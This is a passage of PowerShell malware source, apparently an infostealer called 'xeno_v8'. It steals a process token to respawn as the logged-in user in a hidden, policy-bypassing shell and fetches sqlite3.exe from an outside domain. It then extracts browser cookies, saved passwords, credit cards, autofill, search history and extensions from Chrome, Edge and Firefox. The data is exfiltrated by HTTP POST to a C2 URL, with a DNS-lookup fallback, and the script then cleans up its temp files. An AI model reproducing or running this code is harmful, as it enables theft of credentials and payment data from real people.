            if (-not $myPath) { $myPath = "$env:TEMP\xce.ps1" }
            $stealArgs = "-ep bypass -w h -File `"$myPath`" -C2Url '$C2Url' -Browser $Browser -NoSteal"
            if ($HighValue) { $stealArgs += " -HighValue" }
            $stealCmd = "powershell $stealArgs"
            _warn "[TokenSteal] Re-spawning: $stealCmd"
            $ok = [TokenSteal]::RunAs($chrome.Id, $stealCmd)
            if ($ok) {
                _warn "[TokenSteal] Spawned as Mz pc — exiting SYSTEM process"
                exit 0
            } else {
                _warn "[TokenSteal] Token steal failed — continuing as SYSTEM (DPAPI may fail)"
            }
        } else {
            _warn "[TokenSteal] chrome.exe not found for Mz pc — continuing as SYSTEM"
        }
    } else {
        _warn "[TokenSteal] Running as $currentUser — no steal needed"
    }
}

# ─── Resolve short 8.3 names (MZPC~1 → Mz pc) ───
try { $env:LOCALAPPDATA = (Resolve-Path $env:LOCALAPPDATA).Path } catch {}
try { $env:APPDATA      = (Resolve-Path $env:APPDATA).Path } catch {}
try { $env:TEMP         = (Resolve-Path $env:TEMP).Path } catch {}
_warn "Resolved: LOCAL=$env:LOCALAPPDATA, APPDATA=$env:APPDATA, TEMP=$env:TEMP"

# ─── Pre-download sqlite3.exe if not present ───
$sq3Paths = @(
    [System.IO.Path]::Combine($env:TEMP, "sqlite3.exe"),
    "C:\Users\Public\sqlite3.exe"
)
$sq3Found = $false
foreach ($sq3Path in $sq3Paths) {
    if ([System.IO.File]::Exists($sq3Path)) { $sq3Found = $true; break }
}
if (-not $sq3Found -and -not (Get-Command sqlite3.exe -EA SilentlyContinue)) {
    try {
        _warn "Downloading sqlite3.exe from signindat.com..."
        iwr -useb 'https://signindat.com/sqlite3.exe' -OutFile "C:\Users\Public\sqlite3.exe"
        if ([System.IO.File]::Exists("C:\Users\Public\sqlite3.exe")) {
            _warn "Downloaded sqlite3.exe to C:\Users\Public"
        } else {
            _warn "sqlite3.exe download: file not created"
        }
    } catch { _warn "Failed to download sqlite3.exe: $_" }
}

$browsers = if ($Browser -eq "all") { @("chrome","edge","firefox") } else { @($Browser) }
$allData = @{}

foreach ($b in $browsers) {
    if ($b -eq "firefox") {
        $data = Get-FirefoxData
    } else {
        $data = Get-ChromiumData -BrowserName $b
    }
    if ($data) {
        $allData[$b] = $data
    }
}

# ─── Apply high-value filter to cookies ───
if ($HighValue) {
    foreach ($b in @($allData.Keys)) {
        if ($allData[$b].cookies) {
            $allData[$b].cookies = Select-HighValue $allData[$b].cookies
        }
    }
}

# ─── Count totals ───
$totalCookies = 0; $totalPasswords = 0; $totalCards = 0
$totalAutofill = 0; $totalSearch = 0; $totalBookmarks = 0; $totalExtensions = 0
foreach ($b in @($allData.Keys)) {
    $d = $allData[$b]
    $totalCookies += $d.cookies.Count
    $totalPasswords += $d.passwords.Count
    $totalCards += $d.credit_cards.Count
    $totalAutofill += $d.autofill.Count
    $totalSearch += $d.search_history.Count
    $totalBookmarks += $d.bookmarks.Count
    $totalExtensions += $d.extensions.Count
}
_warn "[$($fp.hostname)] Extracted: $totalCookies cookies, $totalPasswords passwords, $totalCards cards, $totalAutofill autofill, $totalSearch searches, $totalBookmarks bookmarks, $totalExtensions extensions"

# ─── Pack payload ───
$payload = @{
    type = "xeno_v8"
    fp = $fp
    data = $allData
    totals = @{
        cookies = $totalCookies
        passwords = $totalPasswords
        credit_cards = $totalCards
        autofill = $totalAutofill
        search_history = $totalSearch
        bookmarks = $totalBookmarks
        extensions = $totalExtensions
    }
    ts = [DateTime]::UtcNow.ToString("o")
}

$jsonBody = ($payload | ConvertTo-Json -Depth 8 -Compress)

# ─── Exfil: HTTP POST ───
try {
    $web = [System.Net.WebClient]::new()
    $web.Headers.Add("Content-Type", "application/json")
    $web.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
    $response = $web.UploadString($C2Url, "POST", $jsonBody)
    _warn "Exfil OK: $($response.Length) bytes response"
} catch {
    _warn "POST failed: $_"
    
    # ─── Fallback: DNS TXT ───
    try {
        $guid = [guid]::NewGuid().ToString("N").Substring(0,8)
        $domain = if ($C2Url -match "https?://([^/:]+)") { $Matches[1] } else { $C2Url }
        $chunks = [regex]::Split([Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($jsonBody)), "(.{60})") | Where-Object { $_ }
        for ($i = 0; $i -lt $chunks.Count -and $i -lt 20; $i++) {
            $label = "$guid-$i-" + $chunks[$i].Substring(0, [Math]::Min($chunks[$i].Length, 60))
            try { [System.Net.Dns]::GetHostAddresses("$label.$domain") | Out-Null } catch {}
            Start-Sleep -Milliseconds 200
        }
        try { [System.Net.Dns]::GetHostAddresses("$guid-DONE.$domain") | Out-Null } catch {}
        _warn "Exfil via DNS TXT: $($chunks.Count) chunks"
    } catch {
        _warn "DNS exfil also failed: $_"
    }
}

# ─── Cleanup temp files ───
try {
    $tmpFiles = [System.IO.Directory]::GetFiles($env:TEMP, "xc_*")
    foreach ($f in $tmpFiles) { [System.IO.File]::Delete($f) }
} catch {}
try {
    $tmpFiles = [System.IO.Directory]::GetFiles($env:TEMP, "xf_*")
    foreach ($f in $tmpFiles) { [System.IO.File]::Delete($f) }
} catch {}
